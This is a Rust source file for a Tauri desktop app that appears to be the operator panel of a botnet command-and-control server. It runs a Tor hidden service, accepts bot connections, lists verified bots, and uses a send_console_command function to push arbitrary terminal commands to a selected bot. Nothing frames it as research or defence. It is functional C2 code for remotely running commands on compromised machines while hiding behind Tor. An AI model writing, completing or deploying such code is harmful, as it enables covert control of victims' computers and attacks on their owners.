// Prevents additional console window on Windows in release, DO NOT REMOVE!!
#![cfg_attr(not(debug_assertions), windows_subsystem = "windows")]

// Learn more about Tauri commands at https://tauri.app/develop/calling-rust/
use std::{ collections::HashMap, sync::Arc };
use chrono::{ DateTime, Utc };
use serde_json::json;
use server::{ http_server::{ BotMap, ServerHandler }, utils::convert_bot_to_frontend };
use lazy_static::lazy_static;
use server_vars::types::bot::BotItem;
use tauri::{ AppHandle, Manager };
use tokio::sync::RwLock;
use tor_proxy::hidden_service::HiddenServiceRunner;

mod tor_proxy;
mod server;
mod router;

lazy_static! {
    pub static ref SERVER_HANDLER: Arc<RwLock<Option<ServerHandler>>> = Arc::new(RwLock::new(None));
}
#[tauri::command(async)]
async fn get_bot_items(filter_ids: Vec<String>) -> String {
    let server_ref = SERVER_HANDLER.read().await;
    let handler = server_ref.as_ref().unwrap();
    let bot_map = handler.bot_map.read().await;
    // println!("botmap len: {}", bot_map.len());
    let bot_item_map: HashMap<String, BotItem> = bot_map
        .iter()
        .filter(|(id, bot)| { bot.verified && !filter_ids.contains(id) })
        // filter verified, and not already loaded
        .map(|(id, bot)| {
            (id.clone(), futures::executor::block_on(convert_bot_to_frontend(bot)))
        })
        .collect();

    let json_string = serde_json::to_string(&json!(bot_item_map)).unwrap();
    return json_string;
}
#[tauri::command]
async fn send_console_command(
    bot_id: String,
    bot_version: u64,
    command: String
) -> tauri::Result<()> {
    let server_ref = SERVER_HANDLER.read().await;

    let handler = server_ref.as_ref().unwrap();
    let bot_map = handler.bot_map.read().await;

    let action = client_vars::types::receive::ClientAction::CallTerminalCommand;
    let params = client_vars::types::receive::ClientParams::CallTerminalCommand(
        client_vars::types::receive::CallTerminalCommandParams {
            command,
        }
    );

    let bot = bot_map.get(&bot_id).unwrap();
    let instances = bot.client_instances.read().await;

    let client_instance = instances
        .iter()
        .find(|instance| instance.version == bot_version)
        .unwrap();

    let stream_ref = client_instance.stream.clone();
    let last_console = client_instance.console.clone();

    ServerHandler::send_action_to_client(stream_ref, action, params).await.unwrap();
    Ok(())
    // let mut timeout = 0;
    // let timeout_max = 30;
    // loop {
    //     timeout += 1;
    //     if timeout > timeout_max {
    //         println!("returning FailedToExecuteApi");
    //         return Err(
    //             tauri::Error::FailedToExecuteApi(tauri::api::Error::Dialog("Timeouted".to_string()))
    //         );
    //     }
    //     tokio::time::sleep(tokio::time::Duration::from_millis(100)).await;
    //     let bot_map = handler.bot_map.read().await;
    //     let bot = bot_map.get(&bot_id).unwrap();
    //     let instances = bot.client_instances.read().await;
    //     let client_instance = instances
    //         .iter()
    //         .find(|instance| instance.version == bot_version)
    //         .unwrap();
    //     let current_console = client_instance.console.clone();
    //     if current_console != last_console {
    //         println!("returning changed console");
    //         return Ok(current_console);
    //     }
    // }
}

#[tauri::command]
fn greet(name: &str) -> String {
    format!("Hello, {}! You've been greeted from Rust!", name)
}

fn main() {
    let tokio_runtime = tokio::runtime::Builder::new_multi_thread().enable_all().build().unwrap();

    tokio_runtime.spawn(async move {
        let mut onion_proxy = HiddenServiceRunner::new();
        onion_proxy.run();
    });

    tokio_runtime.spawn(async move {
        if let Ok(mut tor_server) = ServerHandler::new().await {
            let mut server_ref = SERVER_HANDLER.write().await;
            *server_ref = Some(tor_server.clone());
            drop(server_ref);

            println!("listen_for_connections on");
            if let Err(e) = tor_server.listen_for_connections().await {
                eprintln!("Server errored out: {}", e);
            }
        }
    });
    tauri::Builder
        ::default()
        .invoke_handler(tauri::generate_handler![greet, get_bot_items, send_console_command])
        .run(tauri::generate_context!())
        .expect("error while running tauri application");
}
